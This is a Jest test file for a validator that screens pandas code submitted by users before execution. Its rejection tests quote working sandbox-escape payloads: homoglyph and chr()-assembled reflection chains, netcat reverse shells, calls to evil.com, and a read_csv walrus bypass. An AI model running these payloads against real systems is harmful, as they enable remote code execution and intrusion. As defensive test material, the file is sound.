import { validateCustomReadCSVFunction, validatePythonCodeForDataFrame } from './pythonCodeValidator'

describe('validatePythonCodeForDataFrame', () => {
    describe('reported bypass: multi-name import with alias', () => {
        it('should block "import pandas as np, os as pandas" (the reported bypass)', () => {
            const result = validatePythonCodeForDataFrame('import pandas as np, os as pandas')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('import statement')
        })

        it('should block the combined bypass + exploitation snippet', () => {
            const result = validatePythonCodeForDataFrame('import pandas as np, os as pandas\npandas.system("xcalc")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('import statement')
        })
    })

    describe('import bypass scenarios', () => {
        it('should block "import os"', () => {
            const result = validatePythonCodeForDataFrame('import os')
            expect(result.valid).toBe(false)
        })

        it('should block if import is stated more than once', () => {
            const result = validatePythonCodeForDataFrame('import import')
            expect(result.valid).toBe(false)
        })

        it('should block "import sys"', () => {
            const result = validatePythonCodeForDataFrame('import sys')
            expect(result.valid).toBe(false)
        })

        it('should block "import subprocess"', () => {
            const result = validatePythonCodeForDataFrame('import subprocess')
            expect(result.valid).toBe(false)
        })

        it('should block "import pandas" (redundant; already in prelude)', () => {
            const result = validatePythonCodeForDataFrame('import pandas')
            expect(result.valid).toBe(false)
        })

        it('should block "import numpy" (redundant; already in prelude)', () => {
            const result = validatePythonCodeForDataFrame('import numpy')
            expect(result.valid).toBe(false)
        })

        it('should block "import pandas as pd"', () => {
            const result = validatePythonCodeForDataFrame('import pandas as pd')
            expect(result.valid).toBe(false)
        })

        it('should block "import pandas, os"', () => {
            const result = validatePythonCodeForDataFrame('import pandas, os')
            expect(result.valid).toBe(false)
        })

        it('should block "import numpy, subprocess"', () => {
            const result = validatePythonCodeForDataFrame('import numpy, subprocess')
            expect(result.valid).toBe(false)
        })

        it('should block "from os import system"', () => {
            const result = validatePythonCodeForDataFrame('from os import system')
            expect(result.valid).toBe(false)
        })

        it('should block "from os import *"', () => {
            const result = validatePythonCodeForDataFrame('from os import *')
            expect(result.valid).toBe(false)
        })

        it('should block "from subprocess import Popen"', () => {
            const result = validatePythonCodeForDataFrame('from subprocess import Popen')
            expect(result.valid).toBe(false)
        })

        it('should block import inside a function definition', () => {
            const result = validatePythonCodeForDataFrame('def f():\n    import os\n    os.system("x")')
            expect(result.valid).toBe(false)
        })

        it('should block import inside a try/except block', () => {
            const result = validatePythonCodeForDataFrame('try:\n    import os\nexcept:\n    pass')
            expect(result.valid).toBe(false)
        })
    })

    describe('Unicode homoglyph bypass (NFKC normalization)', () => {
        // Python NFKC-normalizes identifiers at parse time (PEP 3131), so these
        // homoglyph forms execute as their ASCII equivalents. The validator must
        // normalize before matching or they slip past the ASCII-only denylist.
        it('should block import written with a subscript "i" (\\u1D62)', () => {
            const result = validatePythonCodeForDataFrame('\u1D62mport js')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('import statement')
        })

        it('should block eval written with a script "e" (\\u212F)', () => {
            const result = validatePythonCodeForDataFrame('\u212Fval("__import__(\'os\')")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('eval()')
        })

        it('should block __class__ with a bold "a" (\\u1D41A)', () => {
            const result = validatePythonCodeForDataFrame('().__cl\u{1D41A}ss__')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__class__')
        })

        it('should block __subclasses__ with a bold "a" (\\u1D41A)', () => {
            const result = validatePythonCodeForDataFrame('object.__subcl\u{1D41A}sses__()')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__subclasses__')
        })

        it('should block __builtins__ with a bold "u" (\\u1D42E)', () => {
            const result = validatePythonCodeForDataFrame('x.__b\u{1D42E}iltins__')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__builtins__')
        })

        it('should block getattr with a script "g" (\\u210A)', () => {
            const result = validatePythonCodeForDataFrame('\u210Aetattr(df, "__class__")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('getattr()')
        })

        it('should block chr() used to assemble forbidden names at runtime', () => {
            const result = validatePythonCodeForDataFrame("bi[chr(95)*2 + 'imp' + 'ort' + chr(95)*2]")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('chr() (runtime string assembly)')
        })

        it('should block backslash line continuation bypasses', () => {
            // Python explicit line joining: eval\<newline>(...) is parsed as eval(...)
            const result = validatePythonCodeForDataFrame('eval\\\n(\'__import__("os").system("id")\')')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('eval()')
        })

        it('should block the full reported homoglyph + chr() RCE payload', () => {
            const payload = [
                'cls = ().__cl\u{1D41A}ss__',
                'base = cls.__b\u{1D41A}se__',
                'subs = base.__subcl\u{1D41A}sses__()',
                'for c in subs:',
                "    if c.__name__ == 'catch_warnings':",
                '        cw = c()',
                '        bi = cw._module.__b\u{1D42E}iltins__',
                "        imp_name = chr(95)*2 + 'imp' + 'ort' + chr(95)*2",
                '        imp = bi[imp_name]',
                '        js_mod = imp(chr(106)+chr(115))',
                '        break'
            ].join('\n')
            const result = validatePythonCodeForDataFrame(payload)
            expect(result.valid).toBe(false)
        })
    })

    describe('legitimate pandas and numpy code passes validation', () => {
        it('should allow simple column access', () => {
            expect(validatePythonCodeForDataFrame("df['Age'].mean()").valid).toBe(true)
        })

        it('should allow filtering', () => {
            expect(validatePythonCodeForDataFrame("df[df['Survived'] == 1]['Name'].count()").valid).toBe(true)
        })

        it('should allow len(df)', () => {
            expect(validatePythonCodeForDataFrame('len(df)').valid).toBe(true)
        })

        it('should allow groupby and aggregation', () => {
            expect(validatePythonCodeForDataFrame("df.groupby('Pclass')['Fare'].mean()").valid).toBe(true)
        })

        it('should allow numpy operations using the "np" alias (provided by prelude)', () => {
            expect(validatePythonCodeForDataFrame("np.mean(df['Age'].dropna())").valid).toBe(true)
        })

        it('should allow pandas string methods', () => {
            expect(validatePythonCodeForDataFrame("df['Name'].str.contains('Mr').sum()").valid).toBe(true)
        })

        it('should allow chained method calls', () => {
            expect(validatePythonCodeForDataFrame("df.sort_values('Fare', ascending=False).head(5)['Name'].tolist()").valid).toBe(true)
        })

        it('should allow multi-line pandas code without imports', () => {
            const code = "mask = df['Age'] > 30\nresult = df[mask]['Survived'].mean()\nresult"
            expect(validatePythonCodeForDataFrame(code).valid).toBe(true)
        })

        it('should allow df.astype() (contains "as" but not the word "import")', () => {
            expect(validatePythonCodeForDataFrame("df['Age'].astype(int).mean()").valid).toBe(true)
        })

        it('should allow df.describe()', () => {
            expect(validatePythonCodeForDataFrame('str(df.describe())').valid).toBe(true)
        })
    })

    describe('dangerous builtins are blocked', () => {
        it('should block eval()', () => {
            const result = validatePythonCodeForDataFrame('eval(\'os.system("x")\')')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('eval()')
        })

        it('should block exec()', () => {
            const result = validatePythonCodeForDataFrame('exec("os.system(\'x\')")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('exec()')
        })

        it('should block __import__()', () => {
            const result = validatePythonCodeForDataFrame('__import__("os").system("x")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__import__()')
        })

        it('should block open()', () => {
            const result = validatePythonCodeForDataFrame('open("/etc/passwd").read()')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('open()')
        })

        it('should block globals()', () => {
            const result = validatePythonCodeForDataFrame('globals()["os"].system("x")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('globals()')
        })

        it('should block locals()', () => {
            const result = validatePythonCodeForDataFrame('locals()["df"]')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('locals()')
        })

        it('should block getattr()', () => {
            const result = validatePythonCodeForDataFrame('getattr(df, "__class__")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('getattr()')
        })

        it('should block setattr()', () => {
            const result = validatePythonCodeForDataFrame('setattr(df, "x", 1)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('setattr()')
        })

        it('should block compile()', () => {
            const result = validatePythonCodeForDataFrame('compile("os.system(\'x\')", "<>", "eval")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('compile()')
        })

        it('should block breakpoint()', () => {
            const result = validatePythonCodeForDataFrame('breakpoint()')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('breakpoint()')
        })
    })

    describe('dangerous module access is blocked', () => {
        it('should block os. access', () => {
            const result = validatePythonCodeForDataFrame('os.system("xcalc")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('os module')
        })

        it('should block subprocess. access', () => {
            const result = validatePythonCodeForDataFrame('subprocess.run(["ls"])')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('subprocess module')
        })

        it('should block sys. access', () => {
            const result = validatePythonCodeForDataFrame('sys.exit(0)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('sys module')
        })

        it('should block socket. access', () => {
            const result = validatePythonCodeForDataFrame('socket.connect(("evil.com", 80))')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('socket module')
        })

        it('should block urllib. access', () => {
            const result = validatePythonCodeForDataFrame('urllib.request.urlopen("http://evil.com")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('urllib module')
        })

        it('should block requests. access', () => {
            const result = validatePythonCodeForDataFrame('requests.get("http://evil.com")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('requests module')
        })

        it('should block dangerous modules reached through pandas internals', () => {
            const result = validatePythonCodeForDataFrame('pd.io.common.os.system("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('os module')
        })

        it('should block process execution even if the module was aliased first', () => {
            const result = validatePythonCodeForDataFrame('_m.system("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('process execution function')
        })
    })

    describe('reflection dunder attributes are blocked', () => {
        it('should block __builtins__', () => {
            const result = validatePythonCodeForDataFrame('x = __builtins__')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__builtins__')
        })

        it('should block __subclasses__()', () => {
            const result = validatePythonCodeForDataFrame('().__class__.__bases__[0].__subclasses__()')
            expect(result.valid).toBe(false)
        })

        it('should block __globals__', () => {
            const result = validatePythonCodeForDataFrame('f.__globals__["os"]')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__globals__')
        })

        it('should block __mro__', () => {
            const result = validatePythonCodeForDataFrame('().__class__.__mro__')
            expect(result.valid).toBe(false)
        })

        it('should block __code__', () => {
            const result = validatePythonCodeForDataFrame('f.__code__.co_consts')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__code__')
        })

        it('should block __closure__', () => {
            const result = validatePythonCodeForDataFrame('f.__closure__[0].cell_contents')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__closure__')
        })

        it('should block __getattribute__ (attribute reflection bypass)', () => {
            const result = validatePythonCodeForDataFrame('df.__getattribute__("columns")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__getattribute__ (attribute reflection bypass)')
        })

        it('should block __getattr__ (attribute reflection bypass)', () => {
            const result = validatePythonCodeForDataFrame('obj.__getattr__("columns")')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__getattr__ (attribute reflection bypass)')
        })
    })

    describe('newly added patterns are blocked', () => {
        it('should block vars(df)', () => {
            const result = validatePythonCodeForDataFrame('vars(df)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('vars()')
        })

        it('should block vars() with no arguments', () => {
            const result = validatePythonCodeForDataFrame('vars()')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('vars()')
        })

        it('should block dir(df)', () => {
            const result = validatePythonCodeForDataFrame('dir(df)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('dir()')
        })

        it('should block dir() with no arguments', () => {
            const result = validatePythonCodeForDataFrame('dir()')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('dir()')
        })

        it('should block __dict__ attribute access', () => {
            const result = validatePythonCodeForDataFrame('df.__dict__')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__dict__')
        })

        it('should block __dict__ write (monkey-patching attempt)', () => {
            const result = validatePythonCodeForDataFrame("df.__dict__['_data'] = None")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__dict__')
        })

        it('should block __module__ attribute access', () => {
            const result = validatePythonCodeForDataFrame('df.__module__')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('__module__')
        })

        it('should block vars() used in a reflection chain', () => {
            const result = validatePythonCodeForDataFrame("vars(__builtins__)['__import__']('os').system('x')")
            expect(result.valid).toBe(false)
        })

        it('should block ord() used in runtime string assembly', () => {
            const result = validatePythonCodeForDataFrame("ord('A')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('ord() (runtime string assembly)')
        })

        it('should block ord() used in a character code comparison', () => {
            const result = validatePythonCodeForDataFrame('if ord(c) == 95: pass')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('ord() (runtime string assembly)')
        })
    })

    describe('edge cases and false positive prevention', () => {
        it('should return valid: true for empty string', () => {
            expect(validatePythonCodeForDataFrame('').valid).toBe(true)
        })

        it('should allow "important" — word boundary prevents false match on "import"', () => {
            expect(validatePythonCodeForDataFrame('# this is important').valid).toBe(true)
        })

        it('should allow df.dropna() — "os" inside "dropna" does not match \\bos\\.', () => {
            expect(validatePythonCodeForDataFrame('df.dropna().mean()').valid).toBe(true)
        })

        it('should return a reason string when rejected', () => {
            const result = validatePythonCodeForDataFrame('import os')
            expect(result.valid).toBe(false)
            expect(typeof result.reason).toBe('string')
            expect(result.reason!.length).toBeGreaterThan(0)
        })

        it('should return no reason when valid', () => {
            const result = validatePythonCodeForDataFrame("df['col'].sum()")
            expect(result.valid).toBe(true)
            expect(result.reason).toBeUndefined()
        })

        it('should handle multi-line valid code', () => {
            const code = ["survived = df[df['Survived'] == 1]", 'count = len(survived)', 'count'].join('\n')
            expect(validatePythonCodeForDataFrame(code).valid).toBe(true)
        })
    })
})

describe('validateCustomReadCSVFunction', () => {
    describe('legitimate read_csv calls pass validation', () => {
        it('should allow the default read_csv(csv_data) call', () => {
            expect(validateCustomReadCSVFunction('read_csv(csv_data)').valid).toBe(true)
        })

        it('should allow literal keyword options', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=';', header=0, keep_default_na=False)")
            expect(result.valid).toBe(true)
        })

        it('should allow spaces around keyword equals', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep = ';', header = 0)")
            expect(result.valid).toBe(true)
        })

        it('should allow statement separator characters inside string literals', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=';', lineterminator='\\n')")
            expect(result.valid).toBe(true)
        })

        it('should allow literal lists, tuples, and dictionaries for read_csv options', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, usecols=['Name', 'Age'], na_values={'Age': ['NA', '']})")
            expect(result.valid).toBe(true)
        })

        it('should allow spaces around dictionary colons and a trailing dictionary comma', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, na_values={'Age' : ['NA'],})")
            expect(result.valid).toBe(true)
        })

        it('should allow filepath_or_buffer=csv_data as the explicit source', () => {
            const result = validateCustomReadCSVFunction("read_csv(filepath_or_buffer=csv_data, encoding='utf-8')")
            expect(result.valid).toBe(true)
        })
    })

    describe('code execution bypasses are blocked', () => {
        it('should block the reported walrus tuple bypass in the read_csv source argument', () => {
            const result = validateCustomReadCSVFunction(
                'read_csv((_m := pd.io.common.os, _m.system("/usr/bin/nc 172.17.0.1 13337 -e /bin/sh")))'
            )
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('read from csv_data directly')
        })

        it('should block dangerous attribute access in read_csv keyword values', () => {
            const result = validateCustomReadCSVFunction('read_csv(csv_data, storage_options=pd.io.common.os.environ)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('option values must be')
        })

        it('should block nested function calls in read_csv keyword values', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=str(','))")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('option values must be')
        })

        it('should block lambda converters in read_csv keyword values', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, converters={'Name': lambda value: value})")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('option values must be')
        })

        it('should block positional arguments after csv_data', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, ';')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('keyword arguments')
        })

        it('should block empty arguments', () => {
            const result = validateCustomReadCSVFunction('read_csv(csv_data,, header=0)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('empty arguments')
        })

        it('should block a trailing comma', () => {
            const result = validateCustomReadCSVFunction('read_csv(csv_data, header=0,)')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('empty arguments')
        })

        it('should block duplicate keyword arguments', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, sep=',', sep=';')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('duplicated')
        })

        it('should block duplicate filepath_or_buffer when source is named', () => {
            const result = validateCustomReadCSVFunction("read_csv(filepath_or_buffer=csv_data, filepath_or_buffer='other.csv')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('duplicated')
        })

        it('should block filepath_or_buffer override when source is positional', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, filepath_or_buffer='other.csv')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('duplicated')
        })

        it('should block malformed bracket nesting', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data, usecols=['Name', 'Age')")
            expect(result.valid).toBe(false)
        })

        it('should block top-level semicolon statement chaining', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data); pd.io.common.os.system('id')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('single function call')
        })

        it('should block overlong custom read_csv input', () => {
            const result = validateCustomReadCSVFunction(`read_csv(csv_data, sep='${'a'.repeat(1024)}')`)
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('1024 characters or fewer')
        })

        it('should block trailing code after the read_csv call', () => {
            const result = validateCustomReadCSVFunction("read_csv(csv_data) or pd.io.common.os.system('id')")
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('exactly one complete')
        })

        it('should block homoglyph reflection chained onto a single-line read_csv call', () => {
            const result = validateCustomReadCSVFunction('read_csv(csv_data).__cl\u{1D41A}ss__')
            expect(result.valid).toBe(false)
            expect(result.reason).toContain('exactly one complete')
        })

        it('should block a multi-line homoglyph payload smuggled into the custom read_csv field', () => {
            const payload = 'read_csv(csv_data)\ncls = ().__cl\u{1D41A}ss__'
            const result = validateCustomReadCSVFunction(payload)
            expect(result.valid).toBe(false)
        })

        it('should still allow a benign read_csv even when spelled with a homoglyph (normalized to ASCII)', () => {
            const result = validateCustomReadCSVFunction('r\u212Fad_csv(csv_data)')
            expect(result.valid).toBe(true)
        })
    })
})
